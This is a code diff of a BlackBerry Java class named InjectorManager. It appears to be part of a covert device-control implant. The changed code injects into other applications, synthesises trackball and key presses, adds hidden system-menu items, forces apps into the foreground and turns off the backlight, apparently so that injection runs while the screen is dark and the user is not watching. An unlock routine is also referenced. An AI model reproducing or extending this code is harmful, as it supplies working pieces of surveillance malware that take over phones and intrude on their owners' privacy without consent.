@@ -12,6 +12,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.AppListener;
 import blackberry.Device;
 import blackberry.Singleton;
@@ -265,31 +266,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     }
 
     /**
-     * check if a codname is installed in the system
-     * 
-     * @param name
-     * @return
-     */
-    private boolean exists(String name) {
-        final int handles[] = CodeModuleManager.getModuleHandles();
-
-        final int size = handles.length;
-        for (int i = 0; i < size; i++) {
-            final int handle = handles[i];
-            // CodeModuleManager.getModuleHandle(name)
-            // Retrieve specific information about a module.
-            final String modname = CodeModuleManager.getModuleName(handle);
-            if (modname.equals(name)) {
-                //#ifdef DEBUG
-                debug.trace("exists, found.");
-                //#endif
-                return true;
-            }
-        }
-        return false;
-    }
-
-    /**
      * verifica se occorre procedere con l'unlock.
      */
     private void unLock() {
@@ -356,14 +332,13 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         return false;
     }
 
-    private void removeSystemMenu() {
+    private void addSystemMenu(AInjector injector) {
         //#ifdef DEBUG
-        debug.trace("removeSystemMenu");
+        debug.trace("addSystemMenu");
         //#endif
-
-        ApplicationMenuItemRepository.getInstance().removeMenuItem(
-                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);
-
+        menu = new InjectorSystemMenu(this, injector);
+        menu.addMenu();
+    
     }
 
     private void callSystemMenu() {
@@ -382,30 +357,29 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version 7, track ball up");
             //#endif
-            KeyInjector.trackBallUp(20);
-            Utils.sleep(500);
-            KeyInjector.trackBallClick();
+            KeyInjector.trackBallRaw(20, true);
         } else {
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
             //#endif
-            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(500);
-            KeyInjector.trackBallClick();
+            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         }
 
+        Utils.sleep(500);
+        KeyInjector.trackBallRawClick();
         Utils.sleep(500);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
     }
 
-    private void addSystemMenu(AInjector injector) {
+    private void removeSystemMenu() {
         //#ifdef DEBUG
-        debug.trace("addSystemMenu");
+        debug.trace("removeSystemMenu");
         //#endif
-        menu = new InjectorSystemMenu(this, injector);
-        menu.addMenu();
-
+    
+        ApplicationMenuItemRepository.getInstance().removeMenuItem(
+                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);
+    
     }
 
     private boolean requestForeground(String codName) {
@@ -414,7 +388,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         for (int i = 0; i < apps.length; i++) {
             if (apps[i].getModuleName().indexOf(codName) >= 0) {
                 int processId = manager.getProcessId(apps[i]);
- 
+
                 if (foregroundPin == processId) {
                     //#ifdef DEBUG
                     debug.trace("requestForeground: already foreground");
@@ -427,49 +401,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     manager.requestForeground(processId);
                     return true;
                 }
-            }
-        }
- 
-        return false;
-    }
-    private boolean execute(String command) {
-        ApplicationDescriptor applicationDescriptor = getApplicationDescriptor(command);
-        if (applicationDescriptor != null) {
-            try {
-                String urlModule = applicationDescriptor.getModuleName();
-                //#ifdef DEBUG
-                debug.trace("executeApplication: " + urlModule); //$NON-NLS-1$
-                //#endif
-                ApplicationDescriptor descriptors[] = manager
-                        .getVisibleApplications();
-                for (int i = 0; i < descriptors.length; i++) {
-                    ApplicationDescriptor appdep = descriptors[i];
-                    //#ifdef DEBUG
-                    debug.trace("execute, visible: " + appdep.getName() + " "
-                            + appdep.getModuleName());
-                    //#endif
-                    if (appdep.getModuleName().equals(urlModule)) {
-                        //#ifdef DEBUG
-                        debug.trace("execute, found: " + appdep.getName());
-                        //#endif
-                        int id = manager.getProcessId(appdep);
-                        if (id >= 0) {
-                            manager.requestForeground(id);
-                            status.setBacklight(false);
-                            return true;
-                        } else {
-                            //#ifdef DEBUG
-                            debug.trace("execute: not running");
-                            //#endif
-                        }
-                    }
-
-                }
-                return false;
-            } catch (Exception ex) {
-                //#ifdef DEBUG
-                debug.error("executeApplication: " + ex); //$NON-NLS-1$
-                //#endif
             }
         }
 
@@ -518,11 +449,41 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
     }
 
+    /**
+     * check if a codname is installed in the system
+     * 
+     * @param name
+     * @return
+     */
+    private boolean exists(String name) {
+        final int handles[] = CodeModuleManager.getModuleHandles();
+    
+        final int size = handles.length;
+        for (int i = 0; i < size; i++) {
+            final int handle = handles[i];
+            // CodeModuleManager.getModuleHandle(name)
+            // Retrieve specific information about a module.
+            final String modname = CodeModuleManager.getModuleName(handle);
+            if (modname.equals(name)) {
+                //#ifdef DEBUG
+                debug.trace("exists, found.");
+                //#endif
+                return true;
+            }
+        }
+        return false;
+    }
+
     public void runOnBacklight() {
         //#ifdef DEBUG
         debug.trace("runOnBacklight");
         //#endif
-        injectAll();
+
+        UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+            public void run() {
+                injectAll();
+            }
+        });
     }
 
     /**
@@ -553,13 +514,14 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     debug.trace("onApplicationChange: screen found");
                     //#endif
 
-                    injector.getInjectedApp().invokeAndWait(new Runnable() {
+                    UiApplication.getUiApplication().invokeAndWait(
+                            new Runnable() {
 
-                        public void run() {
-                            injector.playOnScreen(screen);
-                        }
+                                public void run() {
+                                    injector.playOnScreen(screen);
+                                }
 
-                    });
+                            });
 
                     break;
                 }
